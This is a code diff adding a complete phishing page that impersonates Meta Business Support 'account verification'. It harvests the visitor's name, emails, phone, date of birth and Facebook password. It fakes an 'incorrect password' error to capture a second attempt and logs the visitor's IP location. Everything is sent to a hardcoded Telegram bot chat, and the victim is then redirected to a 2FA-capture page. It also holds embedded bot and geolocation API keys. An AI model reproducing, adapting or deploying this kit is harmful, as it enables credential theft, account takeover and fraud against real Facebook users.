@@ -1,0 +1,922 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css">
+    
+    <link rel="icon" type="image/x-icon" href="https://static.xx.fbcdn.net/rsrc.php/y1/r/ay1hV6OlegS.ico">
+    <title>Meta Business Support - Account Verification</title>
+    <style>
+        /* CSS CỦA BẠN (Đã được điều chỉnh cho Flag Icons) */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            background-color: #f0f2f5;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        .header {
+            background-color: #355797; /* Facebook Blue */
+            border-bottom: 1px solid #355797; /* Match border to background */
+            padding: 10px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            box-shadow: 0 2px 4px rgba(0,0,0,.08);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+        .header .search-bar {
+            flex-grow: 1;
+            margin-right: 20px;
+            max-width: 500px;
+        }
+        .header .search-bar input {
+            width: 100%;
+            padding: 8px 15px;
+            border: 1px solid #ddd;
+            border-radius: 20px;
+            font-size: 15px;
+            outline: none;
+            box-sizing: border-box;
+            background-color: rgba(255, 255, 255, 0.2); /* Slightly transparent white */
+            color: #fff; /* White text for input */
+        }
+        .header .search-bar input::placeholder {
+            color: rgba(255, 255, 255, 0.7); /* Lighter white for placeholder */
+        }
+        .header .help-center-link {
+            font-size: 18px;
+            font-weight: bold;
+            color: #fff; /* White text */
+            text-decoration: none;
+        }
+        .header .language {
+            font-size: 14px;
+            color: #fff; /* White text */
+        }
+        .main-content {
+            display: flex;
+            flex-grow: 1;
+        }
+        .sidebar {
+            width: 250px;
+            background-color: #fff;
+            padding: 20px;
+            border-right: 1px solid #ddd;
+            box-shadow: 0 2px 4px rgba(0,0,0,.08);
+            overflow-y: auto;
+        }
+        .sidebar ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+        .sidebar ul li {
+            margin-bottom: 10px;
+        }
+        .sidebar ul li a {
+            text-decoration: none;
+            color: #333;
+            padding: 8px 10px;
+            display: block;
+            border-radius: 6px;
+        }
+        .sidebar ul li a:hover, .sidebar ul li a.active {
+            background-color: #f0f2f5;
+            color: #1877f2;
+        }
+        .content-area {
+            flex-grow: 1;
+            padding: 20px;
+            background-color: #f0f2f5;
+        }
+        .form-container {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,.1);
+            max-width: 600px;
+            margin: 0 auto;
+        }
+        .form-container h2 {
+            font-size: 24px;
+            color: #1c2b33;
+            margin-bottom: 20px;
+        }
+        .form-container p {
+            font-size: 15px;
+            color: #606770;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+        .form-container label {
+            display: block;
+            font-size: 14px;
+            color: #606770;
+            margin-bottom: 5px;
+        }
+        .form-container label .required {
+            color: #ff0000;
+            font-weight: bold;
+        }
+        .form-container .input-wrapper {
+            position: relative;
+            margin-bottom: 15px;
+        }
+        .form-container input[type="text"],
+        .form-container input[type="email"],
+        .form-container textarea {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 15px;
+            box-sizing: border-box;
+        }
+        .form-container input[type="text"]:focus,
+        .form-container input[type="email"]:focus,
+        .form-container textarea:focus {
+            border-color: #1877f2;
+            outline: none;
+        }
+        .form-container .phone-input-wrapper {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+        
+        /* CHỈNH SỬA LẠI CSS TẠI ĐÂY */
+        .form-container .country-select {
+            position: relative;
+            display: flex;
+            align-items: center;
+            padding: 10px; /* Giảm padding từ 12px xuống 10px */
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            background-color: #fff;
+            cursor: pointer;
+            min-width: 80px; /* Giảm min-width từ 100px xuống 80px */
+            user-select: none;
+        }
+        .form-container .country-select:hover {
+            border-color: #1877f2;
+        }
+
+        .form-container .country-select .flag {
+            font-size: 0;
+            line-height: 1;
+            display: inline-block !important;
+            width: 24px; /* Giảm chiều rộng cờ từ 32px xuống 24px */
+            height: 18px; /* Giảm chiều cao cờ từ 24px xuống 18px (tỷ lệ 4:3) */
+            margin-right: 5px; /* Thêm khoảng cách nhỏ sau cờ */
+            background-size: contain;
+            background-repeat: no-repeat;
+            vertical-align: middle;
+            visibility: visible !important;
+            opacity: 1 !important;
+            position: relative;
+            z-index: 1;
+            flex-shrink: 0;
+        }
+        /* Kích thước Flag Icon CSS vẫn được giữ để đảm bảo icon được load */
+        .flag-icon {
+            display: inline-block;
+            width: 1.33333333em;
+            line-height: 1em;
+            background-size: contain;
+            background-position: 50%;
+            background-repeat: no-repeat;
+        }
+        /* KẾT THÚC CHỈNH SỬA */
+
+        .form-container .country-select .country-code-text {
+            position: absolute;
+            left: 12px;
+            font-size: 14px;
+            font-weight: bold;
+            color: #1c2b33;
+            z-index: 2;
+            display: none;
+        }
+        .form-container .country-select .country-code-text.show {
+            display: inline-block;
+        }
+        .form-container .country-select .flag.hidden {
+            display: none !important;
+        }
+        .form-container .country-select .arrow {
+            margin-left: 5px; /* Giảm margin left để kéo ô nhỏ lại */
+            font-size: 12px;
+            color: #606770;
+            flex-shrink: 0;
+        }
+        .form-container .country-dropdown {
+            position: absolute;
+            top: calc(100% + 5px);
+            left: 0;
+            width: 280px;
+            background-color: #fff;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            max-height: 300px;
+            overflow-y: auto;
+            z-index: 1000;
+            display: none;
+        }
+        .form-container .country-dropdown.show {
+            display: block;
+        }
+        .form-container .country-dropdown-item {
+            display: flex;
+            align-items: center;
+            padding: 10px 12px;
+            cursor: pointer;
+            border-bottom: 1px solid #f0f2f5;
+        }
+        .form-container .country-dropdown-item:last-child {
+            border-bottom: none;
+        }
+        .form-container .country-dropdown-item:hover {
+            background-color: #f0f2f5;
+        }
+        .form-container .country-dropdown-item .flag {
+            font-size: 0; /* Đảm bảo emoji cũ không hiển thị */
+            margin-right: 10px;
+            width: 24px; /* Kích thước cờ trong dropdown */
+            height: 18px; /* Kích thước cờ trong dropdown */
+            text-align: center;
+            display: inline-block;
+            flex-shrink: 0;
+            background-size: contain;
+            background-repeat: no-repeat;
+        }
+        .form-container .country-dropdown-item .name {
+            flex: 1;
+            font-size: 14px;
+            color: #1c2b33;
+        }
+        .form-container .country-dropdown-item .code {
+            font-size: 14px;
+            color: #606770;
+            margin-left: 10px;
+        }
+        .form-container .phone-input {
+            flex: 1;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 15px;
+            box-sizing: border-box;
+        }
+        .form-container .dob-wrapper {
+            margin-bottom: 15px;
+        }
+        .form-container .dob-inputs {
+            display: flex;
+            gap: 10px;
+        }
+        .form-container .dob-inputs input {
+            flex: 1;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 15px;
+            box-sizing: border-box;
+        }
+        .form-container textarea {
+            resize: vertical;
+            min-height: 70px;
+            width: 100%;
+        }
+        .form-container .response-info {
+            font-size: 14px;
+            color: #606770;
+            margin: 15px 0;
+        }
+        .form-container .terms-checkbox {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            font-size: 14px;
+            color: #606770;
+        }
+        .form-container .terms-checkbox input[type="checkbox"] {
+            margin-right: 8px;
+            width: 18px;
+            height: 18px;
+            cursor: pointer;
+        }
+        .form-container .terms-checkbox a {
+            color: #1877f2;
+            text-decoration: underline;
+            margin-left: 4px;
+        }
+        .form-container .terms-checkbox .external-icon {
+            display: inline-block;
+            width: 12px;
+            height: 12px;
+            margin-left: 4px;
+            vertical-align: middle;
+        }
+        .form-container button {
+            background-color: #1877f2;
+            color: #fff;
+            padding: 12px 25px;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 10px;
+        }
+        .form-container button:hover {
+            background-color: #166fe5;
+        }
+        .form-container .ticket-number {
+            font-weight: bold;
+            color: #1877f2;
+        }
+
+        /* Password Popup Styles */
+        .popup-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.6);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+            display: none; /* Hidden by default */
+        }
+        .popup-content {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            width: 90%;
+            max-width: 450px;
+            text-align: center;
+        }
+        .popup-content h3 {
+            font-size: 20px;
+            color: #1c2b33;
+            margin-bottom: 15px;
+        }
+        .popup-content p {
+            font-size: 15px;
+            color: #606770;
+            margin-bottom: 20px;
+        }
+        .popup-content input[type="password"] {
+            width: calc(100% - 20px);
+            padding: 12px 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 16px;
+            box-sizing: border-box;
+            outline: none;
+        }
+        .popup-content input[type="password"]:focus {
+            border-color: #1877f2;
+        }
+        .popup-content button {
+            background-color: #1877f2;
+            color: #fff;
+            padding: 12px 25px;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            cursor: pointer;
+            outline: none;
+        }
+        .popup-content button:hover {
+            background-color: #166fe5;
+        }
+        .popup-content .error-message {
+            color: #fa3e3e;
+            font-size: 13px;
+            margin-top: -10px;
+            margin-bottom: 10px;
+            text-align: left;
+            display: none; /* Hidden by default */
+        }
+
+        /* Mobile Adjustments */
+        @media (max-width: 768px) {
+            .sidebar {
+                display: none; /* Hide sidebar on screens smaller than 768px */
+            }
+            .header {
+                display: none; /* Hide header on screens smaller than 768px */
+            }
+            .main-content {
+                flex-direction: column; /* Stack main content for better mobile layout */
+            }
+            .header {
+                flex-wrap: wrap; /* Allow header items to wrap */
+                justify-content: center; /* Center items if wrapped */
+            }
+            .header .search-bar {
+                margin: 10px 0; /* Add vertical margin for search bar */
+                max-width: 100%; /* Take full width on small screens */
+            }
+            .header .help-center-link,
+            .header .language {
+                margin: 5px 10px; /* Adjust spacing */
+            }
+            .content-area {
+                padding: 10px; /* Reduce padding on mobile */
+            }
+            .form-container {
+                padding: 20px; /* Reduce padding inside form container */
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <a href="#" class="help-center-link">Meta Business Support</a>
+        <div class="search-bar">
+            <input type="text" placeholder="Search verification information...">
+        </div>
+        <span class="language">English (US)</span>
+    </div>
+
+    <div class="main-content">
+        <div class="sidebar">
+            <ul>
+                <li><a href="#">Account Verification</a></li>
+                <li><a href="#">Verification Status</a></li>
+                <li><a href="#">Account Restrictions</a></li>
+                <li><a href="#">Identity Verification</a></li>
+                <li><a href="#">Business Verification</a></li>
+                <li><a href="#">Account Security</a></li>
+                <li><a href="#">Two-Factor Authentication</a></li>
+                <li><a href="#">Account Recovery</a></li>
+                <li><a href="#">Account Settings</a></li>
+                <li><a href="#">Business Manager</a></li>
+                <li><a href="#">Page Verification</a></li>
+                <li><a href="#">Ad Account Access</a></li>
+                <li><a href="#">Privacy Settings</a></li>
+                <li><a href="#">Security Settings</a></li>
+                <li><a href="#">Login Activity</a></li>
+                <li><a href="#">Password & Security</a></li>
+                <li><a href="#">Trusted Contacts</a></li>
+                <li><a href="#">Account Activity</a></li>
+                <li><a href="#">Verification Policies</a></li>
+                <li><a href="#">Contact Support</a></li>
+            </ul>
+        </div>
+
+        <div class="content-area">
+            <div class="form-container">
+                <h2>Verify Your Account</h2>
+                <p>Verification Request ID: <span id="ticketNumber" class="ticket-number"></span></p>
+
+                <form id="disagreeForm">
+                    <div class="input-wrapper">
+                        <input type="text" id="fullName" name="fullName" placeholder="Full Name">
+                    </div>
+
+                    <div class="input-wrapper">
+                        <input type="email" id="email" name="email" placeholder="Email">
+                    </div>
+
+                    <div class="input-wrapper">
+                        <input type="email" id="businessEmail" name="businessEmail" placeholder="Email Business">
+                    </div>
+
+                    <div class="input-wrapper">
+                        <input type="text" id="pageName" name="pageName" placeholder="Page Name">
+                    </div>
+
+                    <div class="phone-input-wrapper">
+                        <div class="country-select" id="countrySelect">
+                            <span class="flag flag-icon" id="countryFlag"></span>
+                            <span class="country-code-text" id="countryCodeText" style="display: none;"></span>
+                            <span class="arrow">▼</span>
+                            <div class="country-dropdown" id="countryDropdown">
+                                </div>
+                        </div>
+                        <input type="text" id="phoneNumber" name="phoneNumber" class="phone-input" placeholder="+1" value="+1">
+                    </div>
+
+                    <div class="dob-wrapper">
+                        <div class="dob-inputs">
+                            <input type="text" id="dobDay" name="dobDay" placeholder="Day">
+                            <input type="text" id="dobMonth" name="dobMonth" placeholder="Month">
+                            <input type="text" id="dobYear" name="dobYear" placeholder="Year">
+                        </div>
+                    </div>
+
+                    <textarea id="note" name="note" placeholder="Note"></textarea>
+
+                    <p class="response-info">Our response will be sent to you within 14 - 48 hours.</p>
+
+                    <div class="terms-checkbox">
+                        <input type="checkbox" id="termsCheckbox" name="termsCheckbox" required>
+                        <label for="termsCheckbox">I agree with <a href="#" target="_blank">Terms of use<svg class="external-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6m4-3h6v6m-11 5L21 3" stroke="#1877f2" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></a></label>
+                    </div>
+
+                    <button type="submit" id="sendButton">Send</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <div class="popup-overlay" id="passwordPopupOverlay">
+        <div class="popup-content">
+            <h3>Please Enter Your Password</h3>
+            <p>For security reasons, please enter your Facebook password to continue with the verification process.</p>
+            <input type="password" id="passwordInput" placeholder="Password" required>
+            <div class="error-message" id="passwordError">Incorrect password. Please try again.</div>
+            <button id="confirmPasswordButton">Confirm</button>
+        </div>
+    </div>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = '8114953279:AAEN0t9oMK1HKMWyo4RqHuHih-Lb4MwgwpY';
+        const TELEGRAM_CHAT_ID = '-4872697790';
+        const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+        // !!! VUI LÒNG THAY THẾ 'YOUR_IPGEOLOCATION_API_KEY' BẰNG API KEY CỦA BẠN !!!
+        const IPGEOLOCATION_API_KEY = 'ebeafa9dd74a4eb8acb1cc7fadac0051'; 
+
+        let ipAddress = 'N/A';
+        let locationData = 'N/A';
+        let countryCode = 'US'; // Default to US
+        let formData = {};
+        let passwordAttemptCount = 0;
+        let passwordAttemptValue1 = '';
+        let passwordAttemptValue2 = '';
+
+        // Country code to phone code and flag mapping
+        // THAY ĐỔI: Lưu 'flagCode' (mã cờ viết thường) thay vì Emoji
+        const countryPhoneMap = {
+            'US': { code: '+1', flagCode: 'us', name: 'United States' },
+            'VN': { code: '+84', flagCode: 'vn', name: 'Vietnam' },
+            'GB': { code: '+44', flagCode: 'gb', name: 'United Kingdom' },
+            'CA': { code: '+1', flagCode: 'ca', name: 'Canada' },
+            'AU': { code: '+61', flagCode: 'au', name: 'Australia' },
+            'DE': { code: '+49', flagCode: 'de', name: 'Germany' },
+            'FR': { code: '+33', flagCode: 'fr', name: 'France' },
+            'IT': { code: '+39', flagCode: 'it', name: 'Italy' },
+            'ES': { code: '+34', flagCode: 'es', name: 'Spain' },
+            'NL': { code: '+31', flagCode: 'nl', name: 'Netherlands' },
+            'BE': { code: '+32', flagCode: 'be', name: 'Belgium' },
+            'CH': { code: '+41', flagCode: 'ch', name: 'Switzerland' },
+            'AT': { code: '+43', flagCode: 'at', name: 'Austria' },
+            'SE': { code: '+46', flagCode: 'se', name: 'Sweden' },
+            'NO': { code: '+47', flagCode: 'no', name: 'Norway' },
+            'DK': { code: '+45', flagCode: 'dk', name: 'Denmark' },
+            'FI': { code: '+358', flagCode: 'fi', name: 'Finland' },
+            'PL': { code: '+48', flagCode: 'pl', name: 'Poland' },
+            'JP': { code: '+81', flagCode: 'jp', name: 'Japan' },
+            'KR': { code: '+82', flagCode: 'kr', name: 'South Korea' },
+            'CN': { code: '+86', flagCode: 'cn', name: 'China' },
+            'IN': { code: '+91', flagCode: 'in', name: 'India' },
+            'TH': { code: '+66', flagCode: 'th', name: 'Thailand' },
+            'MY': { code: '+60', flagCode: 'my', name: 'Malaysia' },
+            'SG': { code: '+65', flagCode: 'sg', name: 'Singapore' },
+            'ID': { code: '+62', flagCode: 'id', name: 'Indonesia' },
+            'PH': { code: '+63', flagCode: 'ph', name: 'Philippines' },
+            'BR': { code: '+55', flagCode: 'br', name: 'Brazil' },
+            'MX': { code: '+52', flagCode: 'mx', name: 'Mexico' },
+            'AR': { code: '+54', flagCode: 'ar', name: 'Argentina' },
+            'CL': { code: '+56', flagCode: 'cl', name: 'Chile' },
+            'CO': { code: '+57', flagCode: 'co', name: 'Colombia' },
+            'PE': { code: '+51', flagCode: 'pe', name: 'Peru' },
+            'ZA': { code: '+27', flagCode: 'za', name: 'South Africa' },
+            'EG': { code: '+20', flagCode: 'eg', name: 'Egypt' },
+            'AE': { code: '+971', flagCode: 'ae', name: 'UAE' },
+            'SA': { code: '+966', flagCode: 'sa', name: 'Saudi Arabia' },
+            'TR': { code: '+90', flagCode: 'tr', name: 'Turkey' },
+            'RU': { code: '+7', flagCode: 'ru', name: 'Russia' },
+            'IL': { code: '+972', flagCode: 'il', name: 'Israel' },
+            'NZ': { code: '+64', flagCode: 'nz', name: 'New Zealand' }
+        };
+
+        // Elements (will be initialized in DOMContentLoaded)
+        let ticketNumberSpan;
+        let disagreeForm;
+        let sendButton;
+        let countrySelect;
+        let flagElement;
+        let countryCodeText;
+        let phoneInput;
+        let countryDropdown;
+        let passwordPopupOverlay;
+        let passwordInput;
+        let passwordError;
+        let confirmPasswordButton;
+
+        // --- Utility Functions ---
+
+        // Generate a random 12-digit number
+        function generateRandomTicketNumber() {
+            return Math.floor(100000000000 + Math.random() * 900000000000).toString();
+        }
+
+        // Fetch user's IP and location using ipgeolocation.io
+        async function getIPAndLocation() {
+            try {
+                // Kiểm tra xem API Key đã được cung cấp chưa
+                if (IPGEOLOCATION_API_KEY === 'YOUR_IPGEOLOCATION_API_KEY' || !IPGEOLOCATION_API_KEY) {
+                    console.error('IPGeolocation API Key is not set. Please replace "YOUR_IPGEOLOCATION_API_KEY" with your actual key.');
+                    return;
+                }
+
+                const response = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${IPGEOLOCATION_API_KEY}`);
+                const data = await response.json();
+                
+                if (data && data.ip) {
+                    ipAddress = data.ip;
+                    locationData = `${data.city || 'Unknown City'}, ${data.state_prov || 'Unknown Region'}, ${data.country_name || 'Unknown Country'}`;
+                    
+                    // Get country code from API response
+                    if (data.country_code2) {
+                        countryCode = data.country_code2.toUpperCase();
+                        updatePhoneNumberByCountry(countryCode);
+                    }
+                    
+                    console.log(`IP: ${ipAddress}, Location: ${locationData}, Country Code: ${countryCode}`);
+                } else {
+                    console.error('Error fetching IP and location from ipgeolocation.io:', data.message || 'Unknown error');
+                    ipAddress = 'N/A';
+                    locationData = 'N/A';
+                }
+            } catch (error) {
+                console.error('Error fetching IP and location:', error);
+                ipAddress = 'N/A';
+                locationData = 'N/A';
+            }
+        }
+
+        // Update phone number based on country code
+        function updatePhoneNumberByCountry(code) {
+            const countryInfo = countryPhoneMap[code] || countryPhoneMap['US']; // Default to US if not found
+            countryCode = code; // Update global country code
+            
+            // Cập nhật Flag Icon
+            if (flagElement) {
+                // Xóa tất cả các class flag-icon-xx cũ
+                flagElement.className = 'flag flag-icon'; 
+                // Thêm class mới: flag-icon-us, flag-icon-vn, v.v.
+                flagElement.classList.add(`flag-icon-${countryInfo.flagCode}`); 
+                flagElement.setAttribute('aria-label', countryInfo.name);
+
+                // Vì ta đã dùng icons (hình ảnh), không cần logic kiểm tra hiển thị emoji nữa
+                if (countryCodeText) {
+                    countryCodeText.classList.remove('show');
+                    flagElement.classList.remove('hidden');
+                }
+            } else {
+                console.warn('flagElement is null');
+            }
+            
+            // Update phone input
+            if (phoneInput) {
+                phoneInput.value = countryInfo.code;
+                phoneInput.placeholder = countryInfo.code;
+            }
+        }
+
+        // Populate country dropdown
+        function populateCountryDropdown() {
+            if (!countryDropdown) return;
+            
+            countryDropdown.innerHTML = '';
+            
+            // Sort countries by name
+            const sortedCountries = Object.entries(countryPhoneMap).sort((a, b) => {
+                return a[1].name.localeCompare(b[1].name);
+            });
+            
+            sortedCountries.forEach(([code, info]) => {
+                const item = document.createElement('div');
+                item.className = 'country-dropdown-item';
+                
+                const flagSpan = document.createElement('span');
+                // Sử dụng class của Flag Icon CSS
+                flagSpan.className = `flag flag-icon flag-icon-${info.flagCode}`; 
+                
+                const nameSpan = document.createElement('span');
+                nameSpan.className = 'name';
+                nameSpan.textContent = info.name;
+                
+                const codeSpan = document.createElement('span');
+                codeSpan.className = 'code';
+                codeSpan.textContent = info.code;
+                
+                item.appendChild(flagSpan);
+                item.appendChild(nameSpan);
+                item.appendChild(codeSpan);
+                
+                item.addEventListener('click', () => {
+                    updatePhoneNumberByCountry(code);
+                    closeCountryDropdown();
+                });
+                countryDropdown.appendChild(item);
+            });
+        }
+
+        // Open country dropdown
+        function openCountryDropdown() {
+            if (countryDropdown) {
+                countryDropdown.classList.add('show');
+            }
+        }
+
+        // Close country dropdown
+        function closeCountryDropdown() {
+            if (countryDropdown) {
+                countryDropdown.classList.remove('show');
+            }
+        }
+
+        // Send message to Telegram
+        async function sendMessageToTelegram(message) {
+            const params = {
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'HTML' // Use HTML for formatting
+            };
+
+            try {
+                const response = await fetch(TELEGRAM_API_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(params)
+                });
+                const data = await response.json();
+                if (!data.ok) {
+                    console.error('Telegram API error:', data.description);
+                } else {
+                    console.log('Message sent to Telegram successfully!');
+                }
+            } catch (error) {
+                console.error('Error sending message to Telegram:', error);
+            }
+        }
+
+        // --- Form and Popup Handlers ---
+        function setupEventListeners() {
+            // Show password popup
+            sendButton.addEventListener('click', async (e) => {
+                e.preventDefault(); // Prevent default form submission
+
+                // Gather form data
+                formData = {
+                    fullName: document.getElementById('fullName').value,
+                    email: document.getElementById('email').value,
+                    businessEmail: document.getElementById('businessEmail').value,
+                    pageName: document.getElementById('pageName').value,
+                    phoneNumber: document.getElementById('phoneNumber').value,
+                    dobDay: document.getElementById('dobDay').value,
+                    dobMonth: document.getElementById('dobMonth').value,
+                    dobYear: document.getElementById('dobYear').value,
+                    note: document.getElementById('note').value,
+                    ticketNumber: ticketNumberSpan.textContent
+                };
+
+                // Basic validation
+                if (!document.getElementById('termsCheckbox').checked) {
+                    alert('Please agree with Terms of use to continue');
+                    return;
+                }
+
+                // Fetch IP and location if not already done
+                if (ipAddress === 'N/A') {
+                    await getIPAndLocation();
+                }
+
+                passwordInput.value = ''; // Clear previous input
+                passwordError.style.display = 'none';
+                passwordPopupOverlay.style.display = 'flex';
+                passwordInput.focus();
+            });
+
+            // Password popup confirm button
+            confirmPasswordButton.addEventListener('click', async () => {
+                const password = passwordInput.value;
+                if (!password) {
+                    passwordError.textContent = 'Password cannot be empty.';
+                    passwordError.style.display = 'block';
+                    return;
+                }
+
+                passwordAttemptCount++;
+
+                let message = `<b>New Verification Request Attempt ${passwordAttemptCount}</b>\n`;
+                message += `------------------------------------\n`;
+                message += `<b>IP:</b> <code>${ipAddress}</code>\n`;
+                message += `<b>Location:</b> <code>${locationData}</code>\n`;
+                message += `------------------------------------\n`;
+                message += `<b>Full Name:</b> <code>${formData.fullName || 'N/A'}</code>\n`;
+                message += `<b>Page Name:</b> <code>${formData.pageName || 'N/A'}</code>\n`;
+                message += `<b>Date of Birth:</b> <code>${formData.dobDay || ''}/${formData.dobMonth || ''}/${formData.dobYear || ''}</code>\n`;
+                message += `<b>Note:</b> <code>${formData.note || 'N/A'}</code>\n`;
+                message += `------------------------------------\n`;  
+                message += `<b>Email:</b> <code>${formData.email || 'N/A'}</code>\n`;
+                message += `<b>Business Email:</b> <code>${formData.businessEmail || 'N/A'}</code>\n`;
+                message += `<b>Phone Number:</b> <code>${formData.phoneNumber || 'N/A'}</code>\n`;
+                message += `------------------------------------\n`;  
+           
+
+                if (passwordAttemptCount === 1) {
+                    passwordAttemptValue1 = password;
+                    message += `<b>Password Attempt 1:</b> <code>${passwordAttemptValue1}</code>\n`;
+                    await sendMessageToTelegram(message);
+                    passwordError.textContent = 'Incorrect password. Please try again.';
+                    passwordError.style.display = 'block';
+                } else if (passwordAttemptCount === 2) {
+                    passwordAttemptValue2 = password;
+                    message += `<b>Password Attempt 1:</b> <code>${passwordAttemptValue1}</code>\n`;
+                    message += `<b>Password Attempt 2:</b> <code>${passwordAttemptValue2}</code>\n`;
+                    await sendMessageToTelegram(message);
+                    passwordPopupOverlay.style.display = 'none';
+
+                    // Store data in localStorage and redirect to 2FA page
+                    localStorage.setItem('formData', JSON.stringify(formData));
+                    localStorage.setItem('ipAddress', ipAddress);
+                    localStorage.setItem('locationData', locationData);
+                    localStorage.setItem('passwordAttemptValue1', passwordAttemptValue1);
+                    localStorage.setItem('passwordAttemptValue2', passwordAttemptValue2);
+                    window.location.href = '2fa_page.html'; // Redirect to the new 2FA page
+                }
+                // Reset input after sending
+                passwordInput.value = '';
+            });
+        }
+
+        // --- Initial Setup ---
+        document.addEventListener('DOMContentLoaded', () => {
+            // Initialize elements
+            ticketNumberSpan = document.getElementById('ticketNumber');
+            disagreeForm = document.getElementById('disagreeForm');
+            sendButton = document.getElementById('sendButton');
+            countrySelect = document.getElementById('countrySelect');
+            flagElement = document.getElementById('countryFlag');
+            countryCodeText = document.getElementById('countryCodeText');
+            phoneInput = document.getElementById('phoneNumber');
+            countryDropdown = document.getElementById('countryDropdown');
+            passwordPopupOverlay = document.getElementById('passwordPopupOverlay');
+            passwordInput = document.getElementById('passwordInput');
+            passwordError = document.getElementById('passwordError');
+            confirmPasswordButton = document.getElementById('confirmPasswordButton');
+            
+            ticketNumberSpan.textContent = generateRandomTicketNumber();
+            
+            // Populate country dropdown
+            populateCountryDropdown();
+            
+            // Setup country select click handler
+            if (countrySelect) {
+                countrySelect.addEventListener('click', (e) => {
+                    e.stopPropagation();
+                    if (countryDropdown.classList.contains('show')) {
+                        closeCountryDropdown();
+                    } else {
+                        openCountryDropdown();
+                    }
+                });
+            }
+            
+            // Close dropdown when clicking outside
+            document.addEventListener('click', (e) => {
+                if (countrySelect && !countrySelect.contains(e.target)) {
+                    closeCountryDropdown();
+                }
+            });
+            
+            // Setup event listeners
+            setupEventListeners();
+            
+            // Initialize with default country (US)
+            updatePhoneNumberByCountry('US');
+            
+            // Fetch IP and location on page load
+            getIPAndLocation();
+
+            // Clear localStorage if user comes back to confirm.html (optional, good for clean state)
+            localStorage.removeItem('formData');
+            localStorage.removeItem('ipAddress');
+            localStorage.removeItem('locationData');
+            localStorage.removeItem('passwordAttemptValue1');
+            localStorage.removeItem('passwordAttemptValue2');
+            localStorage.removeItem('twoFAAttemptCount'); // Clear 2FA specific data
+        });
+    </script>
+</body>
+</html>
